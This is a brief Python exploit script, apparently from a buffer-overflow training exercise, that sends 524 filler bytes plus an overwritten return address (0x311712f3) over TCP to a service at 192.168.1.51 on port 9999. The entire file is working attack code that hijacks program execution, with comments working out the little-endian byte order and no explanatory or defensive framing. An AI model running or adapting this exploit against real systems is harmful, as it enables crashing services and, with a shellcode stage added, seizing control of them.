import sys, socket
from time import sleep

#   311712f3
#   f3121731
#   \xf3\x12\x17\x31

buffer = b"A" * 524 + b"\xf3\x12\x17\x31"


print("[+] Sending the payload...")
payload = buffer + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.51',9999))
s.send(payload)
s.close()
sleep(1)
